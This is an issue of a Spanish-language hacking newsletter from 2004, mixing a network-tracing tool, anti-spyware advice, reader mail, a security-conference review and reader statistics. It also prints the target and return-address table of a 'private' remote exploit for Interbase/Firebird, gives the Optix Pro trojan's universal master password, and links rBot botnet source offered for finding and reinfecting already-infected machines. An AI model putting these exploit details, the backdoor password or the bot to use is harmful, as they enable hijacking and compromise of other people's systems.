------------------------------------------------------
  NNL esta mas alla del bien y del mal, no sponsors.
------------------------------------------------------
                                                        17-06-2004

NNL º22 "...si agita hoy, con su aleteo, el aire de Pekín,
una mariposa puede modificar los sistemas climáticos de 
Nueva York el mes que viene". Teoria del Caos

1) Herramienta para plataforma linux: n0t
2) Pequeños consejos al futuro admin/user Windows: Prevención 1
3) Predicciones del mas alla, del mas aca. Prevención 2
4) Mini Analisis de xploit "privado": Borland 7.* remoto
5) Algo de feedback
6) Estadisticas de NNL
7) Troya, esta vez sin Brad Pitt pero con mil kiddies como extras!
8) N de la R. ( Notas de la Redacción, opiniones, noticias, etc )

===========)))================)))=================)))=========


1) Tool: To be or n0t to be.

.----------------------------------------.
| n0t - network 0S tracer, version 1.87  |
| (c) Marcin Ulikowski <r3b00t@itsec.pl> |
`----------------------------------------'

La version mas actualizada siempre la encontraran aqui:
http://r3b00t.itsec.pl/n0t/n0t-latest.tgz

No hay nada que agregar aqui amigos linuxeros, solo en el
readme tienen todo lo que deben saber.

How can I use it and what for?
---------------------------------
n0t should be run on network routers/servers. It is useful 
to get info about machines that are connected to you. 
You can use n0t to:
- watch traffic on your server (+ verbose output & packet dump),
- identify remote OS (also ACK + ...),
- sniff packets in your network,
- detect SYN, XMAS, NULL scan (including NMap),
- detect NAT (Network Address Translation),
- print distance to the remote machine (hops),
- much more.

n0t in action:

(root!osiris ~/n0t)# ./n0t -c n0t-sample.out -i ppp0 -S
n0t - network 0S tracer, version 1.86
(c) Marcin Ulikowski <r3b00t@itsec.pl>
n0t: parsed 156 signatures in 'n0t.fp'
n0t: listening on 'ppp0'
22:30:46 83.28.253.45:1145 -> 217.153.145.198:80 [.S....]
  LEN:48 TTL:64 WSS:5840 DF (0 hops)
  OS: Linux 2.4
22:30:57 83.28.253.45:2563 -> 216.136.204.117:80 [.S....] (NAT)
  LEN:60 TTL:63 WSS:57344 DF (1 hops)
  OS: FreeBSD 4.6 - 4.9
caught SIGINT(2) signal, exiting... (2 packets, 108 bytes read)


$ > # > $ > # > $ > # > $ > # > $ > # > $ > # > $ > # > $ > #


"Porque ha de pasar el señor hiriendo de muerte a los 
egipcios, y al ver la sangre en el dintel y en los dos 
postes, pasará de largo la puerta de aquella casa; ni 
permitirá al ángel exterminador entrar en vuestras 
casas, ni haceros daño."  - ÉXODO 12:23

( no seas tan bruto de pintar con sangre de cordero una cruz 
  en tu server eh! )

----> Sección de prevención, anticipando las plagas. <----

2) Pequeños consejos al futuro admin/user Windows: Prevención 1

Bueno, se viene la era de las infecciones indetectables por
los antivirus mas reconocidos, aun con la maquina patcheada
al ultimo hotfix... via sitio o email, gracias al Internet
Explorer browser. Suena exagerado pero no.
A continuacion un analisis de uno de los tantos ( que ya Norton 
2004 Pro detecta y sin embargo pueden modificarse a gusto para
la indetecccion )

http://62.131.86.111/analysis.htm

Para aquellos que no puede estudiar en profundidad este tipo
de cosas y adoptar medidas de avanzada, tienen las siguientes 
utilidades para prevenir o bien desinfectar:

http://qwikfix.pivx.com/setup/QwikFixSetup.msi 

( Este link se solicita por mail, pero aqui funciona por el 
momento, a la fecha es la version 60beta. Futuro modulo
del SP2 de Windows. )

http://www.netspace.sk/spyware/spybotsd13.exe

Spybot que ya todos conocen, esta es la nueva version.
Consejo ? desinstalar la version 1.2, instalar la 1.3, 
configurarlo, aplicar las inmunidades, luego ir a updates > 
mostrar updates, tildarlas, luego bajarlas con download. 
Solo asi tendran actualizado Spybot y no solo con "mostrando 
updates" ya que solo ello no lo actualizara.


3) Predicciones del mas alla, del mas aca. Prevención 2

Microsoft Security Bulletin MS04-011
Security Update for Microsoft Windows (835732)

Ese patch si bien arreglo cosas, *no* arregló bien un problema 
de seguridad de Utility Manager, este es un aviso de anticipacion, 
en este momento estan haciendo los "proof of concept" exploits, 
para demostrarle a Microsoft su nuevo hoyo y si todo sale de la 
mejor manera, tendremos esos sources entre nosotros antes que los 
publique K-otik > http://www.k-otik.com/exploits/
Hay mas, pero por motivos de contrato de los researchers no 
pueden dar mas info, ya que los datos de la investigacion
pertenecen a la empresa que aporta el capital para la misma.
Noticias 0days ? si, directamente del lab a NNL.
( Hispasec del martes 6 de Julio dirá que patcheen esto si 
  es que Microsoft llega a tiempo con el desarrollo del patch, 
  sino sera el 10 de agosto, ouch!  )

----------------------------------------------------

$ > # > $ > # > $ > # > $ > # > $ > # > $ > # > $ > # > $ > #

4) Mini Analisis de xploit privado: Borland 7.* remoto

Bueno, el exploit publico de esta falla esta publicado hace 
unos dias en: http://www.k-otik.com/exploits/06112004.priv8ibserver.pl.php
Pero este que vemos aqui es el privado, no publico, como tal
tiene mas targets. En comparacion con el publico que solo posee 2,
este tiene 6. Esa es solo algunas de las diferencias que suelen
tener los fuentes que se ponen al publico y otros que se quedan
en las shells/pcs/manos de quienes las hacen y/o allegados.

---8<

if ( $target == "0" ) { # TESTED
        $ret =  0x081b7ee3; # jmp esp
	$pack  = 0;
	$desc    = "Linux Interbase 7.1 SP 2";
	}
if ( $target == "1" ) { # TESTED
        $ret = 0x080c77bd; # jmp esp
	$pack  = 1;
	$desc    = "Linux Interbase 6.01 SS";
	}
if ( $target == "2" ) { # TESTED
        $ret = 0x0804dfe4; # call ecx
	$pack  = 1;
	$desc    = "Linux Interbase 6.01 CS";
	}
if ( $target == "3" ) { # TESTED
        $ret = 0x080e862d; # jmp esp
	$pack  = 1;
	$desc    = "Linux Interbase 6.02 SS";
	}
if ( $target == "4" ) { # TESTED
        $ret = 0x0806bc87; # jmp esi
	$pack  = 1;
	$desc    = "Linux Interbase 6.5";
	}
if ( $target == "5" ) { # TESTED
        $ret = 0x40b3f13c;
	$pack  = 2;
	$desc    = "Linux FireBird 1.5.0 SS";
---8<

Solución para las empresas que utilizan este servicio ?
solo actualizar y administrar debidamente el entorno.


$ > # > $ > # > $ > # > $ > # > $ > # > $ > # > $ > # > $ > #


5) Algo de feedback con los lectores.
   ---------------------------------


From: Carlos Lefans <clefans@***.com>
To: soporte@gmail.com
Date: Tue, 8 Jun 2004 19:06:25 -0300
Subject: Listas

Buenas noches,
En la [nnl] 21, en respuesta a otro listero mencionaste a la 
lista de Cesar Cerrudo: ¿como podemos encontrarla?
Por favor, en lo posible no envies las [nnl] con un link para 
bajar el contenido, muchos las coleccionamos y guardamos en algun 
programa de correo y de esta manera se dificulta tener el 
material a mano, a menos que lo bajemos y nos lo reenviemos 
nosotros mismos como mensaje.
Muchas gracias
Carlos

R:> Podes ir a http://groups.yahoo.com/group/sqlserversecurity/
En cuanto al link es porque no quiero abusar de los recursos de
envio que me provee gratuitamente www.elistas.net ( gracias
Rogelio! )  un problema similar tengo con amigos y lectores 
cubanos que no tienen acceso a la web... y no puedo enviarle 
cuentas de accesos a todos porque algun dia quiero pisar la 
isla tranquilo. El mirror, los files y todas las NNL estan en 
http://nnl.mesi.com.ar, es de un lector que ofrecio su hosting
para alojarnos todo lo que aqui sale. ( Gracias Andres! 
te salude viteh ) No hay porque, saludos.


From: DAC TM <dac@*.com>
To: soporte@gmail.com
Date: Mon, 31 May 2004 20:35:39 +0200
Subject: Saludos!!!

Hola soporte,

Hace tiempo que no recibi la NNL, no se porque, pero 
bueno, tengo aca la 21. la verdad me gusto mucho,
estoy viviendo en Madrid y espero que la magia de la 
informatica haga que me lleguen los proximos numeros. sino, 
me re-suscribire y listo. me mataron las preguntas de los 
lectores!!! deberias hacer un sitio con todo eso, y los 
otros miles que te deben enviar y no públicaste, creo que 
es como minimo divertido!!!
bueno, si te puedo ayudar con algo desde aca, avisa.
--
Afectuosos saludos,
DAC                          mailto:dac@***.com

R:> Hola Dac. No se porque pero a muchos lectores tampoco 
les llego en su totalidad, debe ser por algun limite que 
puso elistas.net en transferencia a usar en el envio de 
boletines... es por esa razon que me cedieron un espacio 
para hacer un mirror de los boletines y los files que a veces 
muestro... ademas de capturas de pantalla. 
Ahi podes bajar siempre todos los NNL en un solo file 
comprimido. Un sitio llevaria mucho trabajo... aunque nunca 
descarto nada :) no te imaginas las cosas que leo y las que no 
publico... sacando los que preguntan algo que ya se respondio y 
los que piden cracks, claves y demas, hay algunos que parecen 
que estan en una pelicula o algo asi. Otros una pena, escriben
mails por demas de extensos y lamentablemente por problemas de 
espacio no puedo publicarlos. Gracias y saludos.


From:   Pablo Torrejón <Pablocyber@**.com>  
To:   NNL Mail
 
Subject:   SSH  
     
Date:   Tue, 01 Jun 2004 17:56:45 -0700  
  
Estimado C* , soy un lector de tus listas desde 
hace mucho tiempo y me inscribi solo por la curiosidad 
de saber un poco mas cada dia , y he recibido mucha 
informacion que no me imaginaba que existia. 
Bueno, resulta que yo estoy estudiando el 1º semestre de ing. 
en ejec. en redes y me pidieron hacer un trabajo sobre SSH y 
como me pelee con mis compañeros mas conocedores en la 
materia resulta que estoy solo en esto. bueno voy al grano 
(como dijo el dermatologo) te queria preguntar si tienes algun 
tipo de informacion relevante con respecto a este tipo de 
conecciones. te agradeceria de ante mano tu ayudita. 

atte 
Pablo Torrejón 
Santiago, Chile  
 

R:> :) Hola Pablo, que buena carrera que en el primer semestre
te hagan estudiar eso... mira, hace un buen trabajo, investiga
y dividelo en partes, analiza cada una de sus cosas y cierralo
con tus propias conclusiones, eso es al menos lo que yo esperaria 
de un alumno regular.
Empieza como siempre por su nacimiento/historia/detalles
http://www.21st-century.net/Pub/Information/Drafts/rfc-ssh.txt
no podes dejar de pegarle una ojeada al libro "SSH The secure Shell
the definitive guide" de O'Reilly... tampoco de analizar programas 
y productos relacionados como los clientes SecureCRT, Putty, el
famoso openssh, mira el comando man de linux +SSH ( y publicar lo 
que te sale en consola solo para demostrarle de que has investigado 
al menos ) - hace unos dias estudiando algo encontre una especie de 
tesis que era un plagio tremendo de un sitio, al final figuraba el 
autor como consulta, pero en realidad era el 30% del trabajo pasteado 
palabra por palabra... era de la UTN de mi ciudad, agarro info de 3 
fuentes, las pasteo en un pdf y lo entrego, que tal ? no hagas lo 
mismo - Lee acerca de implementaciones, en como utilizarlo para crear 
un "environment" mas seguro que con telnet o rlogin, comparalo... 
Averiguate las virtudes y defectos de este, no dejes de ver trabajos 
ya echos > http://www.seguridad.unam.mx/Tutoriales/Tutoriales/ssh/
en fin, volate el cerebro y hace un trabajo original, detallado y 
preciso. Nada de adornar con palabras de mas, ni de rellenarlo o robar
porque tarde o temprano pagaras las consecuencias de no saberlo. 
Exitos.


From:   Daniel Tasé Guerra <dataseg65@**.com>  
To:   NNL MAIL
 
Subject:   3 preguntas, dos de trabajo y una personal  
Date:   Tue, 01 Jun 2004 07:36:07 -0700  

Saludos, NoName ;) 

Hermano, ¿conoces si puede leerse una cuenta Hotmail 
mediante un cliente POP3, al estilo de las de Yahoo, que 
puede hacerse desde Outlook Express o similares clientes? 
La otra de trabajo: ¿qué ha pasado, aprenden informática los 
productores de porno o son los crackers adictos a la pornografía, 
es que no hay un sitio con cracks SIN porno? 
Y la última pregunta, muy personal: ¿puedes tener acceso a la 
cuenta bancaria de Guillermo Francella y averiguar si ha hecho 
alguna transfrencia monetaria muy grande a la TV cubana? Ya vamos 
para tres años con tu coterráneo en nuestra TV, primero "Poné a 
Francella" y luego "Durmiendo con mi jefe" y qué malos son los 
chistes, en su mayoría.  Suerte, brother, disculpa el laconismo, 
pero estoy redactando el informe de fin de mes... Nos leemos, 
saludos desde Cuba... 

Daniel "DA" Tasé Guerra 

R:> Hola Brother, que raro tu escribiendo a NNL... el "DA" es
por el "si" en ruso ? resabios lenguisticos de una epoca ? :) 
1) Hotmail Popper es lo que necesitas http://www.boolean.ca/hotpop
2) Mira, en internet desde tiempos remotos, un sitio con 
infinidad de cracks, siempre genero un caudal de visitas muy 
muy alto, que pasa con esto ? requiere de gran tiempo de 
mantenimiento y el unico redito que ellos pueden sacarle a esto 
es a traves de banners porno que pagan por impresion o click. 
Jamas conseguiran un solo sponsor "normal" ofreciendo solamente 
cracks a los visitantes u otro tipo de cosas ilegales o semi.
3) Aqui lo trataron mal por abrazarse a Fidel, pobre Guillermo y
que ignorante es mucha de mi gente. Mira, hay muy lindas chicas
alli, no puedes quejarte! la mayoria de sus chistes estan echos
en un slang muy tipico de aca, por eso no los debes entender.
( igualmente no te pierdes nada, me causa mas gracia un cura 
brasilero que cierra la programacion aqui a la noche... 
"hiju miu, el diu esta cuntiguuu..." evangelizacion freak )


From: iteclibertad@datafull.com <iteclibertad@***.com>
Reply-To: iteclibertad@****.com
To: "soporte@gmail.com" <soporte@gmail.com>
Date: Tue, 15 Jun 2004 10:56:05 -0300
Subject: consulta 

hola consulto por primera vez pero todas las semanas leo tus 
informes y la verdad te felicito por toda la informacion que 
nos brindas tengo un notebook epson y le colocaron una contraseña 
inical  hay alguna forma de sacarla sin saber las mis desde ya 
muchas gracias

R:> Crea un disquette con esto: 
http://nnl.mesi.com.ar/Change_NT-2000_Passwords.zip 
bootea la desde alli y sigue los pasos...  Saludos. 


From:   akhenaton@***.com  
To:   NNL mail
 
Subject:   gracias por el libro de moore  
     
Date:   Sun, 13 Jun 2004 07:57:56 -0700  
  
Che,gracias por el libro de moore...mientras lo leia no podia 
creerlo y pensaba si eso pasa en el imperio gobernante que nos 
espero a nosotros los subditos...malditos yankies...y como es 
que que moore todavia esta vivo...en otros tiempos lo habrian 
voleteado sin problemas...te imaginas si hubiese sido ESTUPIDOS 
HOMBRE RUSOS en la epoca de stalin no habria durado ni 5 
segundos en pie luego de terminar la primer pagina del libro. 
no te jodo mas...un abrazo... 
AkheNaton 
 
R:> No es nada. Tendrias que ver sus documentales, Roger & me,
The big One, Bowling for Columbine, Farenheit 9/11 que se 
estrena el 25 en eeuu creo, y el resto... no tiene desperdicios,
ademas de informarte lo hace con un humor muy recomendable.
Sin dudas es un tipo con pelotas, teniendo en cuenta de que lo
esta haciendo en un pais que acostumbra a matar a sus presidentes
imaginate. Saludos a vos y a todos los faraones que descanzan 
ahi en el valle.


Feedback: Infosecurity 2004 BsAs, por nuestros corresponsales.
Fueron algunas personas amigas al Hilton, veamos que 
nos dice nuestro amigo G ( coder, geek, user linux desde 
el 93´, blah blah blah )  en "R:>" mis comentarios.

----8<

Resumen de las charlas...

1) Las charlas no estaban muy bien distribuidas en lo
referente al horario, hubo charlas en las que los
que las daban iban a mil por hora, todo porque tenia
45 minutos o menos dado que perdian 10 minutos o mas
en describirte la compañia a la que pertenecian, que
porción de mercado tenian etc.etc. (cosa que me
esperaba dado que la mayoria va a hacer propaganda)...

R:> Si, los sponsors(escenarios) son asi... es como un 
megaconcierto de bandas de rock, no es lo mismo una 
hora de Beck, que una hora de Metallica en la que 
arranca Lars Ulrich con un alto solo de bata rompiendo 
parches... hay que elegir bien que ver, en que stand o 
charla perder el tiempo o participar.

Entre las cosas que puedo describir dado mis escasos
conocimientos en el tema, bueno... solo me quede a la 
charla de "hacking" para ver que decian.... para 
simplificarte te digo estas 2 palabras "stack overflow", 
cosa conocida y que todos en algun momento supimos 
aprovechar :) , bue la cuestion fue mi sorpresa cuando 
gente del auditorio pregunto que era!!, y bueno en ese 
momento me di cuenta que hay gente para todo!!!!, bueno 
la charla fue una explicacion por demas conocida de 
como se ataca por esta tecnica, con un programita que 
hizo el pibe en un redhat 7.1 (bue, con eso te digo 
todo no?) un programita en el que provocaba adrede un
stack overflow y usaba un shellcode (que en internet
hay 10000000) (insisto una vez mas hubo gente que
no sabia lo que era). Bue, la cuestion que claro
provoco el stack overflow y todos lo aplaudieron etc.
etc.

R:> Bueno, hay que tener en cuenta de que hay muchos 
empresarios ahi que no entienden nada mas alla de 
encender su laptop. Yo hubiera echo una charla desde 
cero explicando que es un exploit, las clases, en que
estan echos, para que, porque, les muestro 5 ejemplos 
reales en diferentes plataformas desde una consola o
prompt... todo en una reorica amigable, presento algun 
coder amigo si es necesario hablar mas tecnicamente, 
en fin, la llevas de cero a 10. 
Una charla tan avanzada para un target tan yuppie 
y desinformado es como que no da, pero bueno, para 
ellos ( la mayoria ) era "la gran cosa, jaqin en vivo".
No es para menos la ovacion, yo le tiraba una bomba de 
estruendo abajo de la silla. (jajaja)
El fin es vender seguridad, stands, entradas y 
productos, no pueden hacer un evento apuntado al geek
porque este no es el que aprueba el gasto o bien gasta.
Esos eventos son para que vaya, el encargado de compras
de la empresa o el CEO y su mejor administrador de
sistemas y/o encargado de seguridad.
:)

La charla de utilizacion de google, fue mas o menos
interesante, no por las cosas que presentaban de
google (porque la mayoria uno las conoce, solo te
metes en google y buscar google hacking o lees las
caracteristicas avanzadas de busqueda y listo), pero
mostraron cosas que encontraron en el sitio de
elisa carrio!!..ajajaj los gastos de la campaña en
un excel!!!, en fin...en otro lugar un archivo
con password!!! y bue! asi esta la seguridad!!!.

R:> Wait a minute... mirá, que yo sepa
esa info es publica y esta puesta ahi a proposito:
http://www.elisacarrio.com.ar/elecciones_2003.htm
en planillas excel... de todas maneras lo que encuentre
en un sitio de internet puede estar plantado a 
proposito... entendes ? como lo dije en el NNL 21 en
el tema de las honeypots...  si queres ver informacion
realmente interesante tenes que averiguar donde estan
los servidores de su estudio contable por ejemplo y
en este caso... no Google. 
Iria a esas charlas para divertirme y a hacer contactos, 
son charlas empresariales y de concientizacion, no pidas 
mucho mas. Nosotros somos de otro palo.
:)

La charla mas interesante desde mi punto de vista,
aunque ya conocia el tema, es la validacion de compras
a traves de telefonos celulares, sun y ericsson
estaban haciendo algo de esto hace tiempo, bueno
la cuestion que el que dio la charla mostro una
demo que estaba bastante buena, con lo cual estubo
interesante....aunque no aporto ningun conocimiento
extra (bue, seguramente habia alguno que no sabia ni
lo que era un telefono celular!!!)

R:> Si, un empresario conoce bastante de celulares y 
laptops, tampoco subestimes a todos!
Interesante charla, lo agendare.

En resumen, habia un par de artilugios bastante
interesantes, un firebox, que te rutea te hace
de firewall configuras VPN etc, (aunque algunos
modems adsl ya te lo dejan hacer).
Un par de demostraciones de la gente de impsat de
como utilizaban un lindo aparatito para detectar
ataques...( bue si usas cualquier firewall ya lo
vas a detectar)...y otras cositas pero ya eran tipo
las promotoras :)

R:> Por el aparatito, y si, hay que hacerlo con 
interface, bien bien friendly, para poder venderlo 
bien. Imaginate ahi que plantes un nerd de aquellos 
con una consolita en blanco y negro... no te dan ni 
un mango por mas que sea el mejor admin del mundo. 
Al menos un empresario que no sabe realmente, no. 

Las charlas a mi gusto fueron muy cortas, y de un
nivel medio para abajo. Es decir vas a una exposicion
de seguridad y no puede ser que te expliquen que es
un buffer overflow o un stack overflow. Creo que
tendrian que haber subido un poco el nivel...(aunque
si reconozco que habia gente que estaba dentro de las
charlas y a veces ponia unas caras de no saber de que
corno le hablaban)

R:> Te lo dije antes, son empresarios... no pretendas 
un DEFCON donde van fanaticos de pcs y seguridad, el 
empresario ni sabe el nombre de sus admins.
Y ni te hablo el de una pyme, ni tiene un admin!
Doy fe de que le pidieron a los sponsors material de
contenido academico y no que sean 100% comerciales.
Recuerdo haber leido un mail de la organizacion.

Lo mejor Eber Ludueña!!!! :D :D

R:> Les dije a los organizadores por mail algo como:
"wha´tha fuc??" cuando vi su nombre en el programa.

La organizacion fue mas o menos, mucho despelote
porque habia gente que tenia que hacer una cola
para pagar le daban una tarjetita, pasaba a otra
cola donde le imprimian la credencial, y de ahi
pasaban a buscar los papeles de la exposicion.
Se junto mucha gente y habia 2 personas en cada
lugar....

R:> Es bueno tener un poco de amontonamiento en la 
entrada, btw me esta comentando gente que fue a la 
1ra Infosecurity, que esta fue mas profesional que
la anterior. Hubo catering ? a mi me aseguraron
los organizadores de que iban a dar hasta cerveza 
en el cierre. Si no lo veo no lo creo.

Algunas charlas fueron realmente pateticas. Sobre
todo las que trataron temas de hacking.

R:> Tendria que haber estado alli para verlo, pero 
pensandolo bien, a un empresario sin conocimientos
de seguridad... de que le podes hablar ahi ? 
cosas casi banales para nosotros... heterogenea 
concurrencia. Mirá mi speech: 
"Estimados concurrentes, hablemos de hacking en Argentina, 
bueno, vengo a revelarles la pura verdad. Este no existe, 
existen administradores mediocres e intrusos simples, 
los hackers en este momento estan vendiendoles software 
desde New York para auditoria de plataformas a cargo de 
esos administradores mediocres o bien estan muy entretenidos 
puliendo fallas en Windows, Linux u otros sistemas 
operativos...  todo lo que esta en el medio son oportunistas 
vendiendoles soluciones innecesarias... y muy caras."
Te imaginas ? los volves locos de entretenidos en 2 minutos 
si te la das de juglar ahi con un buen speech estudiado.
Ni hablar si les mostras un par de diapositivas o pantallas
capturadas con algo interesante.
Pero aca el tema es asi... hay que hablar de "hack" para 
vender algo en contra del "hack"... porque lo unico que 
lleva al empresario a gastar guita/pasta/dinero en eso es 
el miedo de que un "hacker" se le meta en su red con 
LanguardScan o con un exploit(ajeno) 0day, me explico ?
Hay muchas cosas pateticas, podria escribirte 3 dias sin 
dormir sobre esto. Esa charla fue dirigida a empresarios,
tomalo por ese lado.
:)

Si bien me cague de risa con Eber Ludueña, no se
que corno tenia que ver ahi....

R:> Yo menos. 
Da gracias a dios que no te aparecio Marcelo Tinelli.
Si llevaban a Les Luthiers para interpretar mails de 
Hispasec en latin aun estoy sentado ahi.

Hubo mucho acoso de parte de los expositores para
que te llevaras muestras y catalogos de productos.
Practicamente era imposible entrar y salir sin que
te llevaras algun panfleto bajo el brazo.

R:> Mientras sean promotoras y no dejen marcas...

Charlas que no tenian nada que ver con seguridad,
hubo una de comercio electronico....pero no desde
el punto de vista de la seguridad, sino te
explicaban que era, te mostraban planillas con
datos estadisticos de lo que la gente compra!!!,
en fin.

R:> ?¿ :) ojo, creo que es la charla que mas apuntaba 
hacia el target de concurrencia.

Si tengo que dar una opinion personal de lo que fue,
te diria que es para ir, hacer conocidos, disfrutar
de un buen cafe. Pero no esperar aprender algo.
Salu2 G

R:> Si, yo iria a hacer contactos comerciales, divertirme 
y a tomarme algo con colegas o lectores de NNL...
Saludos a los organizadores, Martin, Daniel, Aldana & Cia, 
la proxima estare ahi. Gracias x todo. Gracias G.

FOTOS > http://nnl.mesi.com.ar/isec_2004.zip

------xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx:::

6) Estadisticas de NNL

Sistemas Operativos de los lectores:
 
Windows     94.5 % 
Linux        2.8 % 
Desconocido  2.4 % 
Macintosh    0.1 % 

Navegadores:

MS Internet Explorer  84.5 % 
Mozilla                7.7 % 
Opera                  3.7 % 
Desconocido            1.2 % 
Konqueror              0.9 % 
Firebird               0.6 % 
Netscape               0.5 % 
Phoenix                0.1 % 
Safari                 0.1 % 
MultiZilla               0 % 
Otros                  0.2 % 

5 a 7 Gigas mensuales de ancho de banda se utilizan 
aproximadamente para la distro de files y NNLs.

------------:::::::::::::::::::::::::::::::::::::....

7) Troya

Si alguien pensó en algun momento que Sub7 era un buen 
troyano, que vea esto...

http://www.perantivirus.com/sosvirus/virufamo/optix13.htm

Password Universal del Optix Pro:
kjui3498fjk34289890fwe334gfew4ger$"sdf

Y por si fuera poco hay una herramienta privada para encontrar
y reinfectar a todo aquel infectado, de ese troyano o
de las ultimas "issues" de Windows.

Fuentes del programa:

http://nnl.mesi.com.ar/rBot(rxbot)_0404-dcom-priv-OPTIX_MASTERPASSWORD.rar
- Ud es responsable de lo que haga con ello luego de compilarlo -

////////////////////////////////////////////////

8) N de la R. ( Notas de la Redacción, opiniones, noticias, etc )

Seminario de redes y muestra de herramientas para seguridad
y otro software. El seminario se realizara el Viernes 25 de 
Junio, 9.30 HS en El Conquistador Hotel, Suipacha 948.
Para confirmar asistencia (la persona que quiera venir) solo 
necesita enviar un email a clientes@isoftland.com , con el 
tema "Confirmo asistencia al seminario de Redes".

Viaje proximo a China de el presidente Nestor Kirchner...
Me hizo recordar, de que si a alguien le interesa como ejecutivo, 
negociar por aquellos lados, mas vale que le pegue una mirada a 
la informacion de estos archivos sino van a pasar verguenza:
> http://nnl.mesi.com.ar/guanxi.zip

No vean la pelicula Cypher que es un asco. ( no digan que 
no les avise ) Lean para eso el libro Neuromante. 
Disponibles en emule.

Trabajo > http://www.itlaboral.com.ar

p/d: A los 50 primeros que escriban un mail breve de feedback 
interesante ( si es muy largo o solo por interes, lo borro ) 
le envio a su correo una invitacion de Gmail.com
p/d2: Si saben de algun trabajo de consultoria, auditoria o
relacionado a IT, como siempre, avisenme. Muchas Gracias.

Disfruten el dia, el NNL y hasta pronto. :)

Carlos Tori
NNL Newsletter (mirror) http://nnl.mesi.com.ar
________________________________________________________________
Feedback, sugerencias, ofertas de trabajo, anuncios, sponsors, notas, 
contribuciones, dirigirse a: soporte@gmail.com